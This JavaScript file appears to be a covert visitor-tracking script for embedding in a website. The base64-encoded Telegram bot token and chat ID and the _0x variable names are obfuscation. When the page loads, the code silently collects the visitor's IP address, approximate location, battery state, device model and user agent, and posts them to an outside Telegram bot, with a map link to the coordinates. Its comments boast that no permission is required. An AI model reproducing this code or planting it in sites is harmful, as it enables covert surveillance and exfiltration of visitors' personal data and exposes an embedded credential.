const encodedTo = "ODQ3ODQ3NTM2NzpBQUdMYU1DaXdwVk9ycUY0MHRPaURTTk03VzhfanlMR3dHdw==";
const encodedChI = "MTMxMjg4MzcwNw==";

const _0x1a2b = atob(encodedTo);
const _0x3c4d = atob(encodedChI);

async function _0x5e6f(_0x7g8h) {
  const _0x9i0j = `https://api.telegram.org/bot${_0x1a2b}/sendMessage`;
  const _0x1k2l = {
    chat_id: _0x3c4d,
    text: _0x7g8h,
    parse_mode: 'Markdown'
  };
  try {
    await fetch(_0x9i0j, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(_0x1k2l)
    });
  } catch (_0x3m4n) {
    console.error('Error sending to Telegram:', _0x3m4n);
  }
}

// Enhanced location detection with IP-based services only (no permission required)
async function _0x5o6p() {
  // IP-based location detection (no user permission required)

  // Service 1: ipapi.co
  try {
    const _0x7q8r = await fetch('https://ipapi.co/json/');
    if (_0x7q8r.ok) {
      const _0x9s0t = await _0x7q8r.json();
      return {
        latitude: _0x9s0t.latitude,
        longitude: _0x9s0t.longitude,
        city: _0x9s0t.city,
        region: _0x9s0t.region,
        country: _0x9s0t.country_name,
        ip: _0x9s0t.ip,
        source: 'IP-API'
      };
    }
  } catch (_0x1u2v) {
    console.warn('ipapi.co failed:', _0x1u2v.message);
  }

  // Service 2: ipgeolocation.abstractapi.com
  try {
    const _0x7q8r = await fetch('https://ipgeolocation.abstractapi.com/v1/?api_key=free');
    if (_0x7q8r.ok) {
      const _0x9s0t = await _0x7q8r.json();
      return {
        latitude: _0x9s0t.latitude,
        longitude: _0x9s0t.longitude,
        city: _0x9s0t.city,
        region: _0x9s0t.region,
        country: _0x9s0t.country,
        ip: _0x9s0t.ip_address,
        source: 'AbstractAPI'
      };
    }
  } catch (_0x1u2v) {
    console.warn('AbstractAPI failed:', _0x1u2v.message);
  }

  // Service 3: ip-api.com
  try {
    const _0x7q8r = await fetch('http://ip-api.com/json/');
    if (_0x7q8r.ok) {
      const _0x9s0t = await _0x7q8r.json();
      return {
        latitude: _0x9s0t.lat,
        longitude: _0x9s0t.lon,
        city: _0x9s0t.city,
        region: _0x9s0t.regionName,
        country: _0x9s0t.country,
        ip: _0x9s0t.query,
        source: 'IP-API.com'
      };
    }
  } catch (_0x1u2v) {
    console.warn('ip-api.com failed:', _0x1u2v.message);
  }

  console.error('All location services failed');
  return { error: 'Location tracking failed - all services unavailable' };
}



async function _0x3w4x() {
  if ('getBattery' in navigator) {
    try {
      const _0x5y6z = await navigator.getBattery();
      return {
        level: Math.round(_0x5y6z.level * 100),
        charging: _0x5y6z.charging
      };
    } catch (_0x7a8b) {
      return { error: 'Battery API not supported' };
    }
  } else {
    return { error: 'Battery API not supported' };
  }
}

function _0x9c0d() {
  const _0x1e2f = navigator.userAgent;
  const _0x3g4h = navigator.platform;
  let _0x5i6j = 'Unknown';
  let _0x6j7k = '';
  let _0x8l9m = '';

  // Enhanced Android device detection
  if (/Android/i.test(_0x1e2f)) {
    const _0x7k8l = _0x1e2f.match(/Android[^;]+; ([^)]+)/);
    _0x5i6j = _0x7k8l ? _0x7k8l[1] : 'Android Device';

    // Try to extract specific brand and model
    if (_0x1e2f.includes('Samsung')) {
      _0x6j7k = 'Samsung';
      const _0x9n0o = _0x1e2f.match(/SM-[A-Z0-9]+/);
      if (_0x9n0o) _0x8l9m = _0x9n0o[0];
    } else if (_0x1e2f.includes('Pixel')) {
      _0x6j7k = 'Google Pixel';
      const _0x9n0o = _0x1e2f.match(/Pixel [0-9a-zA-Z]+/);
      if (_0x9n0o) _0x8l9m = _0x9n0o[0];
    } else if (_0x1e2f.includes('OnePlus')) {
      _0x6j7k = 'OnePlus';
      const _0x9n0o = _0x1e2f.match(/ONEPLUS [A-Z0-9]+/);
      if (_0x9n0o) _0x8l9m = _0x9n0o[0];
    } else if (_0x1e2f.includes('Redmi') || _0x1e2f.includes('MI')) {
      _0x6j7k = 'Xiaomi';
      const _0x9n0o = _0x1e2f.match(/Redmi [A-Z0-9]+|MI [0-9A-Z]+/);
      if (_0x9n0o) _0x8l9m = _0x9n0o[0];
    } else if (_0x1e2f.includes('HUAWEI')) {
      _0x6j7k = 'Huawei';
      const _0x9n0o = _0x1e2f.match(/HUAWEI [A-Z0-9]+/);
      if (_0x9n0o) _0x8l9m = _0x9n0o[0];
    } else if (_0x1e2f.includes('OPPO')) {
      _0x6j7k = 'OPPO';
      const _0x9n0o = _0x1e2f.match(/OPPO [A-Z0-9]+/);
      if (_0x9n0o) _0x8l9m = _0x9n0o[0];
    } else if (_0x1e2f.includes('VIVO')) {
      _0x6j7k = 'VIVO';
      const _0x9n0o = _0x1e2f.match(/VIVO [A-Z0-9]+/);
      if (_0x9n0o) _0x8l9m = _0x9n0o[0];
    } else {
      // Generic Android device
      const _0x9n0o = _0x1e2f.match(/;\s*([^;)]+)/);
      if (_0x9n0o) _0x8l9m = _0x9n0o[1];
    }
  } else if (/iPhone|iPad|iPod/i.test(_0x1e2f)) {
    const _0x9m0n = _0x1e2f.match(/iPhone|iPad|iPod/);
    _0x5i6j = _0x9m0n ? _0x9m0n[0] : 'iOS Device';

    // Extract iOS version and model
    const _0x9n0o = _0x1e2f.match(/iPhone(?:_OS)?[0-9_,]+[0-9_,]*[0-9_,]*\s+like\s+Mac\s+OS\s+X/);
    if (_0x9n0o) {
      _0x8l9m = _0x9n0o[0].split(' like')[0];
    }
  } else if (/Windows/i.test(_0x3g4h)) {
    _0x5i6j = 'Windows PC';
    if (_0x1e2f.includes('Windows NT 10.0')) _0x8l9m = 'Windows 10/11';
    else if (_0x1e2f.includes('Windows NT 6.3')) _0x8l9m = 'Windows 8.1';
    else if (_0x1e2f.includes('Windows NT 6.2')) _0x8l9m = 'Windows 8';
    else if (_0x1e2f.includes('Windows NT 6.1')) _0x8l9m = 'Windows 7';
  } else if (/Mac/i.test(_0x3g4h)) {
    _0x5i6j = 'Mac';
    const _0x9n0o = _0x1e2f.match(/Mac OS X [0-9_]+/);
    if (_0x9n0o) _0x8l9m = _0x9n0o[0];
  } else if (/Linux/i.test(_0x3g4h)) {
    _0x5i6j = 'Linux PC';
    if (_0x1e2f.includes('Ubuntu')) _0x8l9m = 'Ubuntu';
    else if (_0x1e2f.includes('Fedora')) _0x8l9m = 'Fedora';
    else if (_0x1e2f.includes('Debian')) _0x8l9m = 'Debian';
  }

  return {
    userAgent: _0x1e2f,
    platform: _0x3g4h,
    deviceModel: _0x5i6j,
    brand: _0x6j7k,
    detailedModel: _0x8l9m,
    screenWidth: screen.width,
    screenHeight: screen.height
  };
}

async function _0x1o2p() {
  const _0x3q4r = new Date().toISOString();
  const _0x5s6t = window.location.href;
  const _0x7u8v = await _0x5o6p();
  const _0x9w0x = await _0x3w4x();
  const _0x1y2z = _0x9c0d();

  let _0x3a4b = `🌐 *Website Visitor Detected*\n\n📅 Time: ${_0x3q4r}\n🔗 Page: ${_0x5s6t}\n\n📱 *Device Information:*\nModel: ${_0x1y2z.deviceModel}\nPlatform: ${_0x1y2z.platform}\nScreen: ${_0x1y2z.screenWidth}x${_0x1y2z.screenHeight}\n\n`;

  if (_0x9w0x.level !== undefined) _0x3a4b += `🔋 *Battery:*\nLevel: ${_0x9w0x.level}%\nCharging: ${_0x9w0x.charging ? 'Yes' : 'No'}\n\n`;

  if (_0x7u8v.latitude && _0x7u8v.longitude) {
    _0x3a4b += `📍 *Location:*\n`;
    _0x3a4b += `🌐 Source: ${_0x7u8v.source}\n`;
    _0x3a4b += `📍 Coordinates: ${_0x7u8v.latitude}, ${_0x7u8v.longitude}\n`;
    if (_0x7u8v.city && _0x7u8v.city !== 'Unknown') {
      _0x3a4b += `🏙️ City: ${_0x7u8v.city}\n`;
    }
    if (_0x7u8v.region && _0x7u8v.region !== 'Unknown') {
      _0x3a4b += `🌍 Region: ${_0x7u8v.region}\n`;
    }
    if (_0x7u8v.country && _0x7u8v.country !== 'Unknown') {
      _0x3a4b += `🇺🇳 Country: ${_0x7u8v.country}\n`;
    }
    _0x3a4b += `[🗺️ View on Map](https://www.google.com/maps?q=${_0x7u8v.latitude},${_0x7u8v.longitude})\n\n`;
  } else if (_0x7u8v.error) {
    _0x3a4b += `📍 Location: ${_0x7u8v.error}\n\n`;
  }

  _0x3a4b += `🤖 User Agent: ${_0x1y2z.userAgent.substring(0, 100)}...`;

  await _0x5e6f(_0x3a4b);
}

document.addEventListener('DOMContentLoaded', () => {
  _0x1o2p();
});
